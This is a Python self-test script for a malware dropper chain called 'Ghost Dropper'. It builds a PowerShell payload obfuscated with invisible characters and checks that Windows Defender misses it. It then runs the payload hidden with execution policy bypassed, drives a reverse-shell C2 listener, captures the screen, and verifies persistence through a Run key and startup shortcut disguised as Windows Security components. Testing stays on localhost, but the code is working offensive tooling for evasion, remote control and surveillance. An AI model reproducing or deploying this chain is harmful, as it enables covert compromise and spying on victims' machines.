"""
GHOST DROPPER — Automated Self-Test on Localhost
22DIV // george wu

Full chain test: generate ghost payload → start listener → execute → verify C2.
Tests: connection, shell commands, screen capture, persistence, cleanup.
All on loopback (127.0.0.1). Own hardware only.

Usage:
    python ghost_selftest.py                # full test
    python ghost_selftest.py --port 5555    # custom port
    python ghost_selftest.py --skip-persist # skip persistence test
    python ghost_selftest.py --skip-screen  # skip screen capture test
"""

import os
import sys
import socket
import threading
import subprocess
import time
import re
import argparse

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT = os.path.dirname(os.path.abspath(__file__))
VADER_ROOT = os.path.join(os.path.dirname(ROOT), "vader-rootkit")

G = "\033[92m"
R = "\033[91m"
A = "\033[93m"
C = "\033[96m"
D = "\033[90m"
W = "\033[97m"
B = "\033[1m"
X = "\033[0m"

passed = 0
failed = 0
warnings = 0


def ok(msg):
    global passed
    passed += 1
    print(f"  {G}[PASS]{X} {msg}")


def fail(msg):
    global failed
    failed += 1
    print(f"  {R}[FAIL]{X} {msg}")


def warn(msg):
    global warnings
    warnings += 1
    print(f"  {A}[WARN]{X} {msg}")


def info(msg):
    print(f"  {C}[INFO]{X} {msg}")


def section(title):
    print(f"\n  {C}{B}{'═' * 60}{X}")
    print(f"  {C}{B}  {title}{X}")
    print(f"  {C}{B}{'═' * 60}{X}\n")


def banner():
    print(f"""
  {R}{B}
   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
  ██║  ███╗███████║██║   ██║███████╗   ██║
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝{X}
  {C}SELF-TEST — Automated Dropper Chain Validation{X}
  {D}22DIV // george wu // own hardware only{X}
""")


class C2Listener:
    """Lightweight C2 listener for automated testing."""

    def __init__(self, port):
        self.port = port
        self.sock = None
        self.conn = None
        self.addr = None
        self.connected = threading.Event()
        self.recv_buf = []
        self.recv_lock = threading.Lock()
        self.alive = threading.Event()
        self.thread = None
        self.recv_thread = None
        self.banner_text = ""

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(60)
        self.sock.bind(("127.0.0.1", self.port))
        self.sock.listen(1)
        self.alive.set()
        self.thread = threading.Thread(target=self._accept, daemon=True)
        self.thread.start()

    def _accept(self):
        try:
            self.conn, self.addr = self.sock.accept()
            self.conn.settimeout(1)
            self.connected.set()
            self._recv_loop()
        except socket.timeout:
            pass
        except OSError:
            pass

    def _recv_loop(self):
        while self.alive.is_set():
            try:
                data = self.conn.recv(8192)
                if not data:
                    break
                text = data.decode(errors="replace")
                with self.recv_lock:
                    self.recv_buf.append(text)
                if not self.banner_text and "[GHOST]" in text:
                    self.banner_text = text.strip()
            except socket.timeout:
                continue
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                break

    def wait_connect(self, timeout=30):
        return self.connected.wait(timeout)

    def send_cmd(self, cmd):
        if self.conn:
            self.conn.sendall((cmd + "\n").encode())

    def read_response(self, timeout=10, expect=None):
        deadline = time.time() + timeout
        collected = ""
        while time.time() < deadline:
            time.sleep(0.3)
            with self.recv_lock:
                if self.recv_buf:
                    collected += "".join(self.recv_buf)
                    self.recv_buf.clear()
            if expect and expect in collected:
                return collected
            if not expect and collected and ">" in collected:
                return collected
        with self.recv_lock:
            collected += "".join(self.recv_buf)
            self.recv_buf.clear()
        return collected

    def stop(self):
        self.alive.clear()
        try:
            if self.conn:
                self.conn.sendall(b"exit\n")
                time.sleep(0.3)
                self.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            if self.conn:
                self.conn.close()
        except Exception:
            pass
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass


def test_generate_payload(port):
    """Generate ghost-encoded VADER payload for localhost."""
    section("PHASE 1 — GENERATE GHOST PAYLOAD")

    ghost_encode = os.path.join(ROOT, "ghost_encode.py")
    output = os.path.join(ROOT, "ghost_selftest_vader.ps1")

    if os.path.exists(output):
        os.remove(output)

    info(f"Generating VADER chain payload → 127.0.0.1:{port}")
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"
    r = subprocess.run(
        [sys.executable, ghost_encode, "--vader", "127.0.0.1", str(port),
         "-o", output],
        capture_output=True, text=True, timeout=30,
        env=env, encoding="utf-8", errors="replace"
    )

    if r.returncode != 0:
        fail(f"ghost_encode.py failed: {r.stderr}")
        return None

    if os.path.exists(output):
        size = os.path.getsize(output)
        ok(f"Ghost payload generated: {size:,} bytes")

        with open(output, "r", encoding="utf-8-sig") as f:
            content = f.read()

        if "@'" in content and "'@" in content:
            ok("Here-string payload block present")
        else:
            fail("Missing here-string payload block")
            return None

        visible = re.sub(r'[​-‏⁠-⁯﻿᠎­͏؜ᅟᅠ]', '', content)
        if len(visible) < len(content):
            invisible_count = len(content) - len(visible)
            ok(f"Invisible characters: {invisible_count:,}")
        else:
            fail("No invisible characters found in output")
            return None

        return output
    else:
        fail("Output file not created")
        return None


def test_defender_scan(filepath):
    """Scan the ghost payload with Defender."""
    section("PHASE 2 — DEFENDER SCAN")

    if not os.path.exists(filepath):
        fail("File missing for scan")
        return False

    info(f"Scanning {os.path.basename(filepath)} with Windows Defender...")

    mpcmd = None
    import glob
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"), reverse=True):
        mpcmd = p
        break

    if not mpcmd:
        warn("MpCmdRun.exe not found — skipping Defender scan")
        return True

    try:
        r = subprocess.run(
            [mpcmd, "-Scan", "-ScanType", "3", "-File", filepath, "-DisableRemediation"],
            capture_output=True, text=True, timeout=60
        )
        if "found no threats" in r.stdout.lower() or r.returncode == 0:
            ok(f"Defender scan CLEAN: {os.path.basename(filepath)}")
            return True
        else:
            fail(f"Defender DETECTED threat in {os.path.basename(filepath)}")
            print(f"    {R}{r.stdout[:300]}{X}")
            return False
    except subprocess.TimeoutExpired:
        warn("Defender scan timed out")
        return True
    except Exception as e:
        warn(f"Defender scan error: {e}")
        return True


def test_connection(listener, ghost_ps1, port):
    """Execute ghost payload and test C2 connection."""
    section("PHASE 3 — C2 CONNECTION TEST")

    info(f"Starting C2 listener on 127.0.0.1:{port}")
    listener.start()
    ok(f"Listener bound on port {port}")

    info("Executing ghost payload via PowerShell...")
    ps_proc = subprocess.Popen(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
         "-File", ghost_ps1],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        creationflags=0x08000000  # CREATE_NO_WINDOW
    )
    info(f"PowerShell PID: {ps_proc.pid}")

    info("Waiting for callback (max 30s)...")
    if listener.wait_connect(30):
        ok(f"C2 connection received from {listener.addr}")

        time.sleep(1)
        response = listener.read_response(timeout=5)
        if "[GHOST]" in response or listener.banner_text:
            banner = listener.banner_text or response.strip().split("\n")[0]
            ok(f"Ghost banner received: {banner[:80]}")
        else:
            warn("No ghost banner in initial data")

        return ps_proc
    else:
        fail("No callback received within 30 seconds")
        ps_proc.kill()
        return None


def test_shell_commands(listener):
    """Test shell command execution over C2."""
    section("PHASE 4 — SHELL COMMAND TESTS")

    tests = [
        ("whoami", os.environ.get("USERNAME", "").lower(), "whoami returns current user"),
        ("hostname", os.environ.get("COMPUTERNAME", "").lower(), "hostname returns machine name"),
        ("echo GHOST_C2_ALIVE", "GHOST_C2_ALIVE", "echo command roundtrip"),
        ("$PSVersionTable.PSVersion.Major", "", "PowerShell version query"),
        ("[Environment]::Is64BitProcess", "", "64-bit process check"),
    ]

    for cmd, expect_substr, desc in tests:
        listener.send_cmd(cmd)
        time.sleep(1.5)
        response = listener.read_response(timeout=8)

        if expect_substr and expect_substr.lower() in response.lower():
            ok(f"{desc}: {response.strip()[:60]}")
        elif response.strip():
            ok(f"{desc}: got response ({len(response)} chars)")
        else:
            fail(f"{desc}: no response to '{cmd}'")


def test_screen_capture(listener):
    """Test GDI screen capture over C2."""
    section("PHASE 5 — SCREEN CAPTURE TEST")

    info("Sending 'screen' command...")
    listener.send_cmd("screen")

    time.sleep(5)
    response = listener.read_response(timeout=15, expect="[/SCREEN]")

    if "[SCREEN]" in response and "[/SCREEN]" in response:
        start = response.index("[SCREEN]") + 8
        end = response.index("[/SCREEN]")
        b64_data = response[start:end].strip()
        try:
            import base64
            raw = base64.b64decode(b64_data)
            if raw[:2] == b'\xff\xd8':
                ok(f"Screen capture received: {len(raw):,} bytes (valid JPEG)")

                proof_path = os.path.join(ROOT, "ghost_selftest_screenshot.jpg")
                with open(proof_path, "wb") as f:
                    f.write(raw)
                ok(f"Screenshot saved: {proof_path}")
            else:
                warn(f"Screen data received ({len(raw)} bytes) but not valid JPEG header")
        except Exception as e:
            fail(f"Failed to decode screen capture: {e}")
    else:
        fail("No screen capture data received")
        if response:
            info(f"Response was: {response[:200]}")


def test_persistence(skip=False):
    """Verify persistence artifacts were created, then clean them up."""
    section("PHASE 6 — PERSISTENCE VERIFICATION")

    if skip:
        info("Persistence test skipped (--skip-persist)")
        return

    checks = [
        ("HKCU Run key", "reg_check"),
        ("Startup folder shortcut", "lnk_check"),
    ]

    # Check HKCU Run key
    try:
        r = subprocess.run(
            ["reg", "query", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
             "/v", "SecurityHealthSystray"],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0 and "SecurityHealthSystray" in r.stdout:
            ok("HKCU Run key 'SecurityHealthSystray' present")
        else:
            warn("HKCU Run key not found (may need more time)")
    except Exception as e:
        warn(f"Registry check failed: {e}")

    # Check startup folder shortcut
    startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows",
                           "Start Menu", "Programs", "Startup",
                           "WindowsSecurityHealth.lnk")
    if os.path.exists(startup):
        ok(f"Startup shortcut present: {startup}")
    else:
        warn("Startup shortcut not found (may need more time)")

    # Check ghost.ps1 copy in APPDATA
    ghost_copy = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "ghost.ps1")
    if os.path.exists(ghost_copy):
        ok(f"Ghost copy in APPDATA: {ghost_copy}")
    else:
        warn("Ghost copy not found in APPDATA (may need source path)")


def cleanup(ps_proc, port):
    """Clean up all test artifacts."""
    section("PHASE 7 — CLEANUP")

    # Kill the PowerShell process
    if ps_proc and ps_proc.poll() is None:
        ps_proc.kill()
        ps_proc.wait(timeout=5)
        ok("PowerShell process terminated")

    # Kill any lingering powershell on our ghost script
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-Process powershell -ErrorAction SilentlyContinue | "
             "Where-Object { $_.CommandLine -like '*ghost_selftest*' } | "
             "Stop-Process -Force -ErrorAction SilentlyContinue"],
            capture_output=True, text=True, timeout=10
        )
    except Exception:
        pass

    # Remove persistence artifacts
    info("Removing persistence artifacts...")

    # HKCU Run key
    try:
        subprocess.run(
            ["reg", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
             "/v", "SecurityHealthSystray", "/f"],
            capture_output=True, text=True, timeout=5
        )
        ok("HKCU Run key removed")
    except Exception:
        warn("Could not remove HKCU Run key")

    # Startup shortcut
    startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows",
                           "Start Menu", "Programs", "Startup",
                           "WindowsSecurityHealth.lnk")
    if os.path.exists(startup):
        os.remove(startup)
        ok("Startup shortcut removed")

    # Ghost copy in APPDATA
    ghost_copy = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "ghost.ps1")
    if os.path.exists(ghost_copy):
        os.remove(ghost_copy)
        ok("Ghost APPDATA copy removed")

    # Test payload file
    test_ps1 = os.path.join(ROOT, "ghost_selftest_vader.ps1")
    if os.path.exists(test_ps1):
        os.remove(test_ps1)
        ok("Test payload file removed")

    info("Cleanup complete")


def main():
    parser = argparse.ArgumentParser(description="Ghost Dropper Self-Test")
    parser.add_argument("--port", type=int, default=44444, help="C2 port (default: 44444)")
    parser.add_argument("--skip-persist", action="store_true", help="Skip persistence verification")
    parser.add_argument("--skip-screen", action="store_true", help="Skip screen capture test")
    parser.add_argument("--no-cleanup", action="store_true", help="Leave artifacts for inspection")
    args = parser.parse_args()

    banner()

    listener = C2Listener(args.port)
    ps_proc = None

    try:
        # Phase 1: Generate payload
        ghost_ps1 = test_generate_payload(args.port)
        if not ghost_ps1:
            fail("Cannot continue without payload")
            return 1

        # Phase 2: Defender scan
        test_defender_scan(ghost_ps1)

        # Phase 3: C2 connection
        ps_proc = test_connection(listener, ghost_ps1, args.port)
        if not ps_proc:
            fail("Cannot continue without C2 connection")
            return 1

        # Phase 4: Shell commands
        test_shell_commands(listener)

        # Phase 5: Screen capture
        if args.skip_screen:
            info("Screen capture test skipped (--skip-screen)")
        else:
            test_screen_capture(listener)

        # Phase 6: Persistence
        test_persistence(args.skip_persist)

    except KeyboardInterrupt:
        print(f"\n  {A}[!] Test interrupted{X}")
    except Exception as e:
        fail(f"Unhandled error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Phase 7: Cleanup
        if not args.no_cleanup:
            listener.stop()
            cleanup(ps_proc, args.port)
        else:
            info("Cleanup skipped (--no-cleanup). Kill manually.")
            listener.stop()

    # Summary
    section("RESULTS")
    total = passed + failed
    print(f"  {G}PASSED{X}: {passed}")
    print(f"  {R}FAILED{X}: {failed}")
    print(f"  {A}WARNS{X}:  {warnings}")
    print()

    if failed == 0:
        print(f"  {G}{B}  ██████╗  █████╗ ███████╗███████╗{X}")
        print(f"  {G}{B}  ██╔══██╗██╔══██╗██╔════╝██╔════╝{X}")
        print(f"  {G}{B}  ██████╔╝███████║███████╗███████╗{X}")
        print(f"  {G}{B}  ██╔═══╝ ██╔══██║╚════██║╚════██║{X}")
        print(f"  {G}{B}  ██║     ██║  ██║███████║███████║{X}")
        print(f"  {G}{B}  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝{X}")
        print(f"\n  {G}Ghost dropper chain fully operational.{X}")
    else:
        print(f"\n  {R}Chain has {failed} failure(s). Review output above.{X}")

    print()
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
